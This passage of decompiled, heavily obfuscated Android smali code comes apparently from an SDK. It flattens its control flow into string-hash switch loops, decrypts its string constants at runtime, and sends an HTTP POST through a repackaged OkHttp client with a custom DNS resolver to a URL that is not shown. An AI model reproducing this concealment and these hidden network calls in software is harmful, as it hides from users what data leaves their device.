    const v10, -0x5e55ab71

    const-string v2, "\u06d9\u06e8\u06da\u06da\u06e5\u06ec\u06e1\u06e4\u06da\u06dc\u06df\u06d6\u06d8\u06d8\u06eb\u06ec\u06dc\u06d8\u06e1\u06e4\u06e6\u06d6\u06e2\u06e6\u06da\u06ec\u06e6\u06e7\u06d8\u06e4\u06d9\u06d8"

    :goto_c
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_6

    goto :goto_c

    :goto_d
    :sswitch_12
    const v4, -0x6c723f70

    const-string v2, "\u06eb\u06e4\u06d8\u06d8\u06d8\u06d9\u06eb\u06e5\u06d9\u06e8\u06d8\u06d8\u06e8\u06e1\u06d8\u06df\u06e1\u06e5\u06d8\u06e4\u06df\u06e5\u06d8\u06e6\u06d9\u06e5\u06d8\u06e4\u06da\u06e0\u06e5\u06ec\u06dc\u06e0\u06e2\u06e1\u06e6\u06d8\u06e6\u06d8\u06e5\u06e6\u06dc\u06d8\u06d6\u06e2\u06df\u06ec\u06d6\u06e6\u06df\u06e6\u06e2\u06e1\u06e6\u06db\u06dc\u06ec\u06e4\u06d9"

    :goto_e
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v4

    sparse-switch v6, :sswitch_data_7

    goto :goto_e

    :sswitch_13
    const v6, -0x1327ae18

    const-string v2, "\u06e7\u06ec\u06dc\u06e0\u06d6\u06e6\u06d8\u06d8\u06d7\u06dc\u06d8\u06df\u06e2\u06e1\u06db\u06e2\u06e6\u06d6\u06d9\u06d9\u06e2\u06df\u06d6\u06df\u06e0\u06e4\u06e4\u06d7\u06dc\u06d8\u06e1\u06da\u06e6"

    :goto_f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v6

    sparse-switch v8, :sswitch_data_8

    goto :goto_f

    :sswitch_14
    const-string v2, "\u06e7\u06d8\u06e1\u06e8\u06d6\u06e7\u06d8\u06e4\u06ec\u06dc\u06db\u06e0\u06e8\u06d7\u06e1\u06e5\u06e2\u06d8\u06d9\u06db\u06e1\u06e8\u06d6\u06e4\u06d6\u06d8\u06d8\u06e6\u06e4\u06e8\u06e8\u06db"

    goto :goto_e

    :sswitch_15
    :try_start_4
    const-string v2, "\u06d9\u06e6\u06dc\u06e1\u06d7\u06e0\u06d6\u06df\u06e4\u06d8\u06e4\u06dc\u06d8\u06db\u06e5\u06e0\u06eb\u06e6\u06e1\u06e5\u06eb\u06e6\u06d8\u06e0\u06e6\u06e1\u06d8\u06e5\u06e8\u06ec\u06ec\u06e6\u06d9\u06e5\u06d6\u06eb\u06d9\u06eb\u06dc\u06d8\u06da\u06e8\u06d7\u06e7\u06e1\u06d9"

    goto/16 :goto_7

    :sswitch_16
    const v7, -0x6c164fca

    const-string v2, "\u06e5\u06d7\u06e2\u06eb\u06e7\u06e6\u06da\u06e4\u06e5\u06d8\u06e2\u06d6\u06e0\u06dc\u06dc\u06d6\u06e6\u06e7\u06e2\u06e8\u06e0\u06d8\u06e4\u06d6\u06d9\u06d8\u06da\u06db\u06e1\u06d8\u06d8\u06d6\u06d7\u06e6\u06db\u06e5\u06df\u06e7\u06e8\u06ec\u06da\u06e5\u06e1\u06d9\u06e1\u06d8\u06d8\u06ec\u06eb\u06d6\u06d8"

    :goto_10
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_9

    goto :goto_10

    :sswitch_17
    const-string v2, "\u06e7\u06e5\u06e5\u06da\u06d7\u06d8\u06d8\u06e7\u06d9\u06df\u06d6\u06d6\u06e7\u06d9\u06e4\u06e0\u06e1\u06e0\u06e8\u06d8\u06da\u06ec\u06d6\u06d8\u06e4\u06ec\u06d6\u06d8\u06eb\u06df\u06e6\u06e7\u06e2\u06e1\u06d7\u06eb\u06d7\u06dc\u06e1\u06d8\u06d8\u06d6\u06e1\u06d8\u06d8\u06df\u06e8\u06e2"

    goto/16 :goto_7

    :cond_2
    const-string v2, "\u06da\u06e2\u06dc\u06d8\u06df\u06eb\u06ec\u06e7\u06e5\u06e1\u06ec\u06d9\u06db\u06eb\u06da\u06d6\u06d8\u06df\u06e1\u06eb\u06d8\u06d6\u06e5\u06db\u06e0\u06e7\u06e6\u06d8\u06d6\u06e1\u06d6\u06e5"

    goto :goto_10

    :sswitch_18
    array-length v2, v4

    if-lez v2, :cond_2

    const-string v2, "\u06e6\u06d9\u06e6\u06d8\u06d8\u06d9\u06e5\u06d8\u06ec\u06dc\u06dc\u06e7\u06d9\u06d6\u06e1\u06eb\u06e1\u06e1\u06eb\u06df\u06e6\u06dc\u06eb\u06d6\u06e0\u06ec\u06e8\u06e6\u06db\u06eb\u06d8\u06e2"

    goto :goto_10

    :sswitch_19
    const-string v2, "\u06eb\u06e0\u06df\u06e4\u06da\u06e5\u06e7\u06e7\u06e4\u06da\u06ec\u06e0\u06e6\u06d8\u06e4\u06e6\u06e8\u06dc\u06df\u06db\u06e7\u06e5\u06d9\u06e7\u06df\u06d7\u06df\u06e1\u06d8\u06e7\u06e4\u06e8\u06e1\u06d8\u06da\u06eb\u06db\u06e6\u06d8\u06d6\u06e4\u06e4\u06df"

    goto :goto_10

    :sswitch_1a
    const-string v2, "\u06dc\u06da\u06e1\u06e5\u06dc\u06e1\u06e5\u06e0\u06df\u06da\u06e8\u06e7\u06e2\u06d6\u06d6\u06d8\u06d9\u06e0\u06db\u06db\u06eb\u06e1\u06d8\u06ec\u06e2\u06e2\u06eb\u06e8\u06e4\u06e5\u06db\u06e1\u06e6\u06e0\u06e5\u06d8\u06eb\u06e7\u06e7\u06db\u06e2\u06e4\u06e7\u06d6\u06eb\u06e6\u06d7\u06d9\u06e0\u06e0\u06e1\u06e4\u06db\u06e7\u06dc\u06dc\u06d7"
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto/16 :goto_7

    :catch_0
    move-exception v4

    move-object v2, v3

    :goto_11
    const-string v5, "Dqy0lbFFQye696jR7ESXjE2u58avNbvz\n"

    const-string v7, "6R8PcgraB2k=\n"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v5, v7, v8, v4}, LCu7y/sdk/r;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/lang/Exception;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "ObXgWToK4Q==\n"

    const-string v7, "TtSSN1NkhtM=\n"

    invoke-static {v5, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_8

    :sswitch_1b
    move-object v2, v3

    goto/16 :goto_8

    :sswitch_1c
    :try_start_5
    const-string v2, "\u06d8\u06d7\u06e8\u06e8\u06e5\u06e0\u06e5\u06d8\u06d6\u06d8\u06d7\u06d6\u06d6\u06d8\u06db\u06d9\u06e5\u06d8\u06df\u06ec\u06e0\u06da\u06da\u06da\u06db\u06e8\u06da\u06e6\u06eb\u06d9\u06da\u06e1\u06e1\u06d9\u06e0\u06d7\u06e1\u06e8\u06da\u06db\u06da\u06dc\u06e5\u06d6\u06d8\u06d9\u06e6\u06dc\u06eb\u06eb\u06d6\u06e4\u06e8\u06e1\u06d6\u06d6\u06d8"

    goto :goto_9

    :sswitch_1d
    const v11, -0x746e0cef

    const-string v2, "\u06d7\u06e2\u06db\u06e5\u06dc\u06e4\u06da\u06e0\u06d8\u06d8\u06e6\u06df\u06e5\u06d8\u06e1\u06d9\u06df\u06d9\u06e8\u06d8\u06e8\u06d7\u06e5\u06ec\u06dc\u06e7\u06e7\u06db\u06dc\u06eb\u06d7\u06e4\u06ec\u06d9\u06eb\u06d9\u06d6\u06d8\u06d9\u06dc\u06e2\u06d7\u06da\u06ec\u06dc\u06e6\u06d8\u06e2\u06db\u06db\u06d9\u06e2\u06e7\u06ec\u06e2"

    :goto_12
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_a

    goto :goto_12

    :sswitch_1e
    if-eqz v5, :cond_3

    const-string v2, "\u06e4\u06d7\u06db\u06d9\u06df\u06eb\u06e7\u06e1\u06e0\u06e1\u06e6\u06da\u06dc\u06e2\u06d8\u06d8\u06df\u06e0\u06e8\u06d6\u06df\u06eb\u06d6\u06e0\u06da\u06e0\u06df\u06df\u06e8\u06e0\u06d8\u06d8"

    goto :goto_12

    :cond_3
    const-string v2, "\u06da\u06db\u06db\u06dc\u06d7\u06d8\u06e0\u06eb\u06e8\u06d8\u06dc\u06e4\u06e8\u06e2\u06e6\u06d6\u06e6\u06db\u06e5\u06e0\u06da\u06d6\u06e4\u06df\u06ec\u06da\u06e8\u06dc\u06d8\u06df\u06e8\u06e1\u06d8\u06df\u06e5\u06e8\u06e8\u06e6\u06d8\u06d8\u06d9\u06e1\u06e7\u06ec\u06e5\u06d8\u06e7\u06eb\u06e1\u06e1\u06e8\u06dc\u06d8"

    goto :goto_12

    :sswitch_1f
    const-string v2, "\u06e4\u06ec\u06d7\u06dc\u06da\u06e2\u06e1\u06e1\u06e4\u06eb\u06d8\u06d8\u06d8\u06ec\u06e6\u06d6\u06d6\u06e4\u06db\u06e0\u06e5\u06e4\u06d7\u06e4\u06e0\u06eb\u06e2\u06d9\u06d9\u06d6\u06e1\u06d8\u06e2\u06df\u06e6\u06e4\u06db\u06df\u06d9\u06d8\u06e8\u06dc\u06e7\u06da\u06ec\u06d9\u06e4\u06eb\u06e6\u06d8"

    goto :goto_12

    :sswitch_20
    const-string v2, "\u06e1\u06da\u06e1\u06d8\u06d8\u06d9\u06d6\u06e8\u06e8\u06d9\u06da\u06df\u06eb\u06db\u06e6\u06d8\u06d8\u06e8\u06df\u06e6\u06e6\u06e0\u06da\u06e6\u06ec\u06e0\u06df\u06d8\u06d8\u06e4\u06df\u06e5\u06d8"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    goto/16 :goto_9

    :sswitch_21
    const-string v2, "\u06dc\u06e4\u06d6\u06d8\u06df\u06ec\u06e6\u06d8\u06d6\u06d7\u06da\u06eb\u06eb\u06da\u06dc\u06e4\u06e2\u06e7\u06dc\u06e7\u06d8\u06d8\u06d6\u06da\u06e7\u06d8\u06e6\u06d8\u06e8\u06eb\u06e5\u06d8\u06e2\u06e2\u06d8\u06ec\u06df\u06dc\u06e7\u06e8\u06e0\u06e7\u06e4\u06ec\u06e2\u06da\u06e4"

    goto/16 :goto_9

    :sswitch_22
    :try_start_6
    new-instance v2, Ljava/util/concurrent/atomic/AtomicReference;

    invoke-direct {v2}, Ljava/util/concurrent/atomic/AtomicReference;-><init>()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :try_start_7
    new-instance v2, Lcom/shadow/okhttp3/OkHttpClient$Builder;

    invoke-direct {v2}, Lcom/shadow/okhttp3/OkHttpClient$Builder;-><init>()V

    new-instance v5, LCu7y/sdk/d5;

    const/4 v10, 0x0

    invoke-direct {v5, v6, v10}, LCu7y/sdk/d5;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->dns(Lcom/shadow/okhttp3/Dns;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    new-instance v5, Lcom/shadow/okhttp3/ConnectionSpec$Builder;

    sget-object v10, Lcom/shadow/okhttp3/ConnectionSpec;->MODERN_TLS:Lcom/shadow/okhttp3/ConnectionSpec;

    invoke-direct {v5, v10}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;-><init>(Lcom/shadow/okhttp3/ConnectionSpec;)V

    const/4 v10, 0x2

    new-array v10, v10, [Lcom/shadow/okhttp3/TlsVersion;

    const/4 v11, 0x0

    sget-object v12, Lcom/shadow/okhttp3/TlsVersion;->TLS_1_3:Lcom/shadow/okhttp3/TlsVersion;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    sget-object v12, Lcom/shadow/okhttp3/TlsVersion;->TLS_1_2:Lcom/shadow/okhttp3/TlsVersion;

    aput-object v12, v10, v11

    invoke-virtual {v5, v10}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;->tlsVersions([Lcom/shadow/okhttp3/TlsVersion;)Lcom/shadow/okhttp3/ConnectionSpec$Builder;

    move-result-object v5

    const/4 v10, 0x5

    new-array v10, v10, [Lcom/shadow/okhttp3/CipherSuite;

    const/4 v11, 0x0

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_AES_128_GCM_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_AES_256_GCM_SHA384:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x2

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_CHACHA20_POLY1305_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x3

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    const/4 v11, 0x4

    sget-object v12, Lcom/shadow/okhttp3/CipherSuite;->TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:Lcom/shadow/okhttp3/CipherSuite;

    aput-object v12, v10, v11

    invoke-virtual {v5, v10}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;->cipherSuites([Lcom/shadow/okhttp3/CipherSuite;)Lcom/shadow/okhttp3/ConnectionSpec$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lcom/shadow/okhttp3/ConnectionSpec$Builder;->build()Lcom/shadow/okhttp3/ConnectionSpec;

    move-result-object v5

    invoke-static {v5}, Ljava/util/Collections;->singletonList(Ljava/lang/Object;)Ljava/util/List;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->connectionSpecs(Ljava/util/List;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    sget-object v5, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v10, 0xa

    invoke-virtual {v2, v10, v11, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->connectTimeout(JLjava/util/concurrent/TimeUnit;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    const-wide/16 v10, 0xa

    invoke-virtual {v2, v10, v11, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->readTimeout(JLjava/util/concurrent/TimeUnit;)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    const/4 v5, 0x1

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->retryOnConnectionFailure(Z)Lcom/shadow/okhttp3/OkHttpClient$Builder;

    move-result-object v2

    invoke-virtual {v2}, Lcom/shadow/okhttp3/OkHttpClient$Builder;->build()Lcom/shadow/okhttp3/OkHttpClient;

    move-result-object v2

    const-string v5, "/NPMh2ZmH4z0zNLEdygJj+qO2oR9aFON78/ZhWxqGp35\n"

    const-string v10, "naO86w8Ffvg=\n"

    invoke-static {v5, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/shadow/okhttp3/MediaType;->get(Ljava/lang/String;)Lcom/shadow/okhttp3/MediaType;

    move-result-object v5

    invoke-static {v8, v5}, Lcom/shadow/okhttp3/RequestBody;->create(Ljava/lang/String;Lcom/shadow/okhttp3/MediaType;)Lcom/shadow/okhttp3/RequestBody;

    move-result-object v5

    new-instance v10, Lcom/shadow/okhttp3/Request$Builder;

    invoke-direct {v10}, Lcom/shadow/okhttp3/Request$Builder;-><init>()V

    invoke-virtual {v10, v6}, Lcom/shadow/okhttp3/Request$Builder;->url(Ljava/lang/String;)Lcom/shadow/okhttp3/Request$Builder;

    move-result-object v10

    invoke-virtual {v10, v5}, Lcom/shadow/okhttp3/Request$Builder;->post(Lcom/shadow/okhttp3/RequestBody;)Lcom/shadow/okhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lcom/shadow/okhttp3/Request$Builder;->build()Lcom/shadow/okhttp3/Request;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/shadow/okhttp3/OkHttpClient;->newCall(Lcom/shadow/okhttp3/Request;)Lcom/shadow/okhttp3/Call;

    move-result-object v2

    invoke-interface {v2}, Lcom/shadow/okhttp3/Call;->execute()Lcom/shadow/okhttp3/Response;

    move-result-object v10

    invoke-virtual {v10}, Lcom/shadow/okhttp3/Response;->code()I

    move-result v2

    const v11, 0x5fb78883

    const-string v5, "\u06e7\u06eb\u06e6\u06dc\u06d8\u06d8\u06e1\u06e4\u06d6\u06d8\u06e8\u06e0\u06d6\u06d8\u06db\u06e2\u06eb\u06e7\u06e5\u06e5\u06df\u06e2\u06eb\u06da\u06e1\u06dc\u06d8\u06dc\u06db\u06d6\u06d8\u06e0\u06e7\u06e1\u06d8\u06dc\u06ec\u06ec\u06da\u06d9\u06dc\u06e8\u06e8\u06ec\u06d9\u06db\u06da\u06dc\u06e1\u06db\u06e0\u06e1\u06d8\u06e5\u06e5\u06e7\u06d8\u06d9\u06e6\u06da"

    :goto_13
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_b

    goto :goto_13

    :sswitch_23
    const v5, -0x27132620

    :try_start_8
    const-string v4, "\u06eb\u06e1\u06db\u06e6\u06e8\u06e8\u06e2\u06d7\u06e4\u06ec\u06d9\u06da\u06e1\u06eb\u06d8\u06d8\u06e6\u06dc\u06e2\u06e1\u06d7\u06d8\u06d8\u06dc\u06dc\u06db\u06e6\u06d8\u06d8\u06db\u06d6\u06ec\u06e2\u06db\u06dc\u06d8\u06d9\u06d7\u06d6\u06d8\u06e8\u06e5\u06e8\u06d8\u06e8\u06db\u06d9"

    :goto_14
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v5

    sparse-switch v11, :sswitch_data_c

    goto :goto_14

    :sswitch_24
    const v11, -0xc44eff6

    const-string v4, "\u06e4\u06e1\u06e1\u06dc\u06dc\u06da\u06e1\u06ec\u06db\u06e6\u06dc\u06e2\u06d9\u06dc\u06e6\u06dc\u06d8\u06d9\u06dc\u06dc\u06d8\u06e8\u06d8\u06dc\u06e5\u06e1\u06d6\u06d8\u06dc\u06e1\u06eb\u06da\u06d6\u06e2\u06e7\u06d7\u06dc\u06d8\u06ec\u06e8\u06e4\u06eb\u06d8\u06dc\u06d8\u06d6\u06ec\u06dc\u06d8\u06d7\u06db\u06e6\u06d8"

    :goto_15
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_d

    goto :goto_15

    :sswitch_25
    invoke-virtual {v10}, Lcom/shadow/okhttp3/Response;->body()Lcom/shadow/okhttp3/ResponseBody;

    move-result-object v4

    if-eqz v4, :cond_5

    const-string v4, "\u06df\u06d8\u06d9\u06e7\u06e1\u06e7\u06e0\u06da\u06e8\u06d8\u06e6\u06d8\u06e0\u06d9\u06d6\u06e8\u06da\u06df\u06e4\u06dc\u06e7\u06eb\u06e5\u06d7\u06e8\u06df\u06e6\u06dc\u06d8\u06e4\u06e7\u06d9\u06db\u06e0\u06ec\u06eb"
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_b

    goto :goto_15

    :sswitch_26
    :try_start_9
    const-string v5, "\u06e6\u06e2\u06e6\u06d8\u06e8\u06db\u06e1\u06e1\u06d8\u06db\u06da\u06d8\u06da\u06e5\u06d7\u06dc\u06eb\u06dc\u06e5\u06d8\u06d7\u06e7\u06dc\u06d8\u06e8\u06e5\u06e5\u06d7\u06dc\u06d7\u06eb\u06d6\u06d8\u06d8\u06db\u06d9\u06e1\u06d7\u06db\u06d6\u06e7\u06d7\u06e4\u06d9\u06ec\u06e0\u06e1\u06d8\u06e0\u06e1\u06d8\u06da\u06e1\u06e6\u06d8\u06e8\u06dc\u06e5\u06d8"

    goto :goto_13

    :sswitch_27
    const v12, -0x4688487b

    const-string v5, "\u06d9\u06e6\u06e4\u06ec\u06db\u06eb\u06db\u06d6\u06e2\u06dc\u06e0\u06e5\u06d8\u06d6\u06d9\u06e2\u06d7\u06e5\u06e8\u06e7\u06d8\u06d8\u06db\u06db\u06e7\u06d8\u06df\u06d8\u06d8\u06e6\u06e6\u06e1\u06e6\u06d8\u06eb\u06e5\u06e7\u06d8\u06e4\u06e6\u06e6\u06d9\u06e7\u06e8\u06d8\u06e6\u06e0\u06da\u06d7\u06e8\u06d8\u06e6\u06db\u06e6\u06da\u06e2\u06dc\u06d8"

    :goto_16
    invoke-virtual {v5}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_e

    goto :goto_16

    :sswitch_28
    const-string v5, "\u06d7\u06ec\u06e2\u06dc\u06d7\u06db\u06d8\u06e8\u06d6\u06e6\u06e1\u06e4\u06d9\u06eb\u06d7\u06e2\u06e4\u06e6\u06e8\u06e6\u06e1\u06dc\u06d8\u06e7\u06e1\u06ec\u06d6\u06e1\u06d6\u06ec\u06e2\u06e5\u06e6\u06d8\u06e0\u06e1\u06e8"

    goto :goto_13

    :cond_4
    const-string v5, "\u06eb\u06db\u06df\u06e2\u06d7\u06e5\u06d8\u06dc\u06ec\u06e7\u06df\u06e8\u06e5\u06e0\u06d9\u06df\u06e4\u06e8\u06d8\u06d8\u06da\u06e0\u06dc\u06eb\u06d7\u06e4\u06dc\u06df\u06e4\u06da\u06d8\u06e1\u06e2\u06df\u06db\u06d7\u06eb"

    goto :goto_16

    :sswitch_29
    const/16 v5, 0xc8

    if-ne v2, v5, :cond_4

    const-string v5, "\u06e6\u06d8\u06d8\u06db\u06d9\u06d9\u06d6\u06d6\u06e4\u06e7\u06dc\u06dc\u06e7\u06e0\u06e7\u06e6\u06e5\u06dc\u06e7\u06e8\u06e8\u06d8\u06d6\u06eb\u06d7\u06d9\u06d8\u06d8\u06da\u06d8\u06e2"

    goto :goto_16

    :sswitch_2a
    const-string v5, "\u06e7\u06df\u06e8\u06eb\u06e1\u06e1\u06d8\u06db\u06d9\u06e1\u06d6\u06d8\u06e1\u06d6\u06e5\u06d8\u06d9\u06d9\u06db\u06db\u06e4\u06dc\u06db\u06e8\u06d7\u06db\u06df\u06e1\u06d8\u06eb\u06d6\u06d8\u06d6\u06dc\u06d6\u06e6\u06e5\u06e1\u06dc\u06d8\u06d8\u06d6\u06dc\u06e2\u06d8\u06e1\u06eb\u06d8\u06e7"
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_1

    goto :goto_16

    :sswitch_2b
    const-string v5, "\u06d9\u06e8\u06dc\u06d7\u06e8\u06d8\u06d8\u06e7\u06e5\u06d6\u06ec\u06d8\u06e4\u06e1\u06e2\u06e5\u06d8\u06d9\u06d9\u06e8\u06d8\u06df\u06e7\u06da\u06df\u06df\u06e1\u06d8\u06d9\u06d9\u06db\u06db\u06e4\u06ec\u06ec\u06e5\u06d8\u06df\u06d9\u06df\u06db\u06e7\u06d6\u06d8\u06ec\u06e6\u06d7"

    goto :goto_13

    :sswitch_2c
    :try_start_a
    const-string v4, "\u06e0\u06e8\u06ec\u06db\u06d7\u06e1\u06d8\u06d7\u06e6\u06d8\u06d8\u06da\u06d8\u06e5\u06da\u06db\u06e8\u06da\u06e7\u06d6\u06d7\u06e8\u06d7\u06e1\u06dc\u06dc\u06d8\u06e5\u06e2\u06e0\u06e8\u06da\u06e7\u06db\u06e8\u06d8\u06d8\u06da\u06e7"

    goto :goto_14

    :cond_5
    const-string v4, "\u06e1\u06da\u06df\u06da\u06da\u06e4\u06eb\u06e0\u06eb\u06da\u06d7\u06e5\u06eb\u06da\u06e1\u06e2\u06da\u06d8\u06dc\u06d8\u06d7\u06e4\u06d6\u06e8\u06eb\u06d8\u06e1\u06d8\u06d7\u06d8\u06e1\u06d8\u06eb\u06e1\u06d8\u06d8\u06eb\u06dc\u06e6\u06d8\u06e2\u06e4\u06e6\u06d8\u06e6\u06e2\u06ec\u06e0\u06d8\u06e1\u06d8\u06e7\u06db\u06d8"

    goto :goto_15

    :sswitch_2d
    const-string v4, "\u06d8\u06db\u06d8\u06d8\u06e2\u06dc\u06d8\u06d9\u06d9\u06df\u06e8\u06d7\u06e5\u06e0\u06d8\u06e6\u06e8\u06d6\u06e1\u06df\u06ec\u06db\u06e8\u06da\u06d6\u06d7\u06d6\u06ec\u06e4\u06da\u06ec\u06d9\u06e8\u06e0\u06e7\u06e4\u06d6\u06d8"

    goto :goto_15

    :sswitch_2e
    const-string v4, "\u06e0\u06ec\u06e6\u06df\u06d7\u06e8\u06e8\u06dc\u06e5\u06d6\u06d8\u06e2\u06e5\u06da\u06e8\u06d8\u06df\u06eb\u06e2\u06da\u06d7\u06dc\u06d7\u06d7\u06da\u06da\u06ec\u06e1\u06e8\u06ec\u06dc\u06df\u06df\u06d8\u06d6\u06e4\u06e1\u06eb\u06db\u06d7\u06e4\u06d6\u06d8\u06d8"

    goto :goto_14

    :sswitch_2f
    const-string v4, "\u06e6\u06ec\u06eb\u06e8\u06d8\u06da\u06e5\u06e6\u06da\u06e5\u06ec\u06df\u06d8\u06da\u06e1\u06d8\u06e1\u06d6\u06da\u06eb\u06df\u06da\u06e5\u06e8\u06d7\u06ec\u06d6\u06e5\u06e1\u06e4\u06da\u06e8\u06eb\u06e2\u06d9\u06d6\u06e1\u06d8\u06da\u06d8\u06e7\u06d8\u06e7\u06da\u06e1\u06d8\u06d7\u06dc\u06e7\u06d8\u06df\u06d8\u06e7\u06d8"

    goto :goto_14

    :sswitch_30
    invoke-virtual {v10}, Lcom/shadow/okhttp3/Response;->body()Lcom/shadow/okhttp3/ResponseBody;

    move-result-object v4

    invoke-virtual {v4}, Lcom/shadow/okhttp3/ResponseBody;->string()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_b

    const/4 v4, 0x1

    move v5, v2

    goto/16 :goto_b

    :catch_1
    move-exception v5

    move v2, v4

    :goto_17
    :try_start_b
    invoke-virtual {v5}, Ljava/lang/Throwable;->printStackTrace()V

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "0PsxMM5YW84EU9N4hkcxuDsChGnrHgHScQ3aN9Vh\n"

    const-string v11, "lLVi2Gn7vVA=\n"

    invoke-static {v10, v11}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, "jU7NkvE=\n"

    const-string v10, "6Dy//YNnbAU=\n"

    invoke-static {v5, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_3

    const/4 v4, 0x0

    const/4 v5, 0x0

    aget v5, p4, v5

    add-int/lit8 v5, v5, 0x1

    aput v5, p4, v4

    goto/16 :goto_a

    :sswitch_31
    const-string v2, "\u06d8\u06e4\u06d6\u06e7\u06d8\u06d8\u06e1\u06eb\u06d6\u06d8\u06db\u06e8\u06d8\u06da\u06e5\u06e0\u06eb\u06d9\u06db\u06e6\u06d7\u06d7\u06e6\u06e0\u06ec\u06e5\u06d8\u06d6\u06eb\u06e7\u06dc\u06d8\u06e4\u06e2\u06e8\u06df\u06e0\u06e5"

    goto/16 :goto_c

    :sswitch_32
    const v11, -0x691e8847

    const-string v2, "\u06db\u06db\u06df\u06e6\u06e5\u06d9\u06e5\u06e5\u06da\u06eb\u06e5\u06e6\u06da\u06e5\u06d6\u06d8\u06db\u06e7\u06e5\u06d9\u06db\u06e8\u06e8\u06d8\u06eb\u06eb\u06e4\u06da\u06e5\u06e5\u06d8\u06dc\u06da\u06e1\u06e8\u06da\u06da\u06e8\u06e8\u06e8\u06d8\u06e2\u06eb\u06d6\u06e8\u06db\u06e4\u06db\u06dc\u06e7\u06d8"

    :goto_18
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v12

